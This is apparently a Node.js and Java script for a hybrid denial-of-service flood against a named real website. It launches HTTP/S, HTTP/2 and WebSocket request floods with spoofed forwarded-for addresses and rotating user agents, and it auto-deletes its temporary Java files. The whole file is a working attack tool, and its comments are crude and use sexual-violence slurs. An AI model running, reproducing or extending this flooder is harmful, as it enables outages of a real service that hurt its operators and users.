const { execSync, spawn } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const os = require('os');
const WebSocket = require('ws');
const http2 = require('http2');

// ====== CONFIG ======
const TARGET = "https://www.roblox.com"; // Fuck this site raw
const THREADS = 1000; // Node.js async rape
const JAVA_THREADS = 500; // Java threads for extra pain
const DURATION = 60 * 1000; // 1 minute of hell
const WS_FLOOD = true; // WebSocket rape enabled
const HTTP2_FLOOD = true; // HTTP/2 multiplexing abuse

// ====== JAVA TEMP FILE ======
const javaCode = `
import java.net.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.*;

public class ediOP3HTTPJava {
    public static void main(String[] args) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(${JAVA_THREADS});
        String target = "${TARGET}";
        List<String> userAgents = Arrays.asList(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        );
        
        for (int i = 0; i < ${JAVA_THREADS}; i++) {
            executor.submit(() -> {
                try {
                    URL url = new URL(target);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("User-Agent", userAgents.get(new Random().nextInt(userAgents.size())));
                    conn.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                    conn.setRequestProperty("X-Forwarded-For", getRandomIP());
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    conn.getResponseCode(); // Trigger request
                } catch (Exception e) {}
            });
        }
        executor.shutdown();
    }

    private static String getRandomIP() {
        return new Random().nextInt(255) + "." + new Random().nextInt(255) + "." + new Random().nextInt(255) + "." + new Random().nextInt(255);
    }
}
`;

// ====== NODE.JS FLOODER (UPGRADED) ======
async function flood() {
    console.log("[+] Starting ediOP3HTTP Hybrid Flood Attack.");
    
    // Write Java temp file
    const javaFile = `${os.tmpdir()}/ediOP3HTTPJava_${uuidv4()}.java`;
    fs.writeFileSync(javaFile, javaCode);
    
    // Compile & run Java
    execSync(`javac ${javaFile}`);
    const javaClass = javaFile.split('/').pop().replace('.java', '');
    const javaProcess = spawn('java', [javaClass], { detached: true });
    
    // Node.js flood
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    ];

    // HTTP/2 Flood
    if (HTTP2_FLOOD) {
        const http2Flood = () => {
            const client = http2.connect(TARGET);
            client.on('error', () => {});
            for (let i = 0; i < 50; i++) { // HTTP/2 multiplexing rape
                const req = client.request({
                    ':path': `/${uuidv4()}`,
                    ':method': 'GET',
                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
                });
                req.on('response', () => {});
                req.end();
            }
        };
        setInterval(http2Flood, 100);
    }

    // WebSocket Flood
    if (WS_FLOOD) {
        const wsFlood = () => {
            const ws = new WebSocket(TARGET.replace('https', 'wss'));
            ws.on('open', () => {
                setInterval(() => {
                    ws.send(JSON.stringify({ trash: uuidv4() })); // Spam trash data
                }, 100);
            });
            ws.on('error', () => {});
        };
        setInterval(wsFlood, 50);
    }

    // Classic HTTP/S Flood
    const attack = async () => {
        const options = {
            hostname: new URL(TARGET).hostname,
            port: 443,
            path: `/${uuidv4()}?${uuidv4()}`, // Random path + query attack
            method: 'GET',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Accept-Language': 'en-US,en;q=0.9',
                'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive', // Keep sockets open like a fucking parasite
                'Upgrade': 'websocket' // Fake upgrade headers for extra chaos
            }
        };
        
        const req = https.request(options, (res) => {});
        req.on('error', () => {});
        req.end();
    };
    
    // Launch threads
    for (let i = 0; i < THREADS; i++) {
        setInterval(attack, 1); // Maximum fucking speed
    }
    
    // Auto-delete Java temp file after attack
    setTimeout(() => {
        javaProcess.kill();
        fs.unlinkSync(javaFile);
        fs.unlinkSync(javaFile.replace('.java', '.class'));
        console.log("[+] Java temp files deleted. Attack complete.");
    }, DURATION);
}

flood();
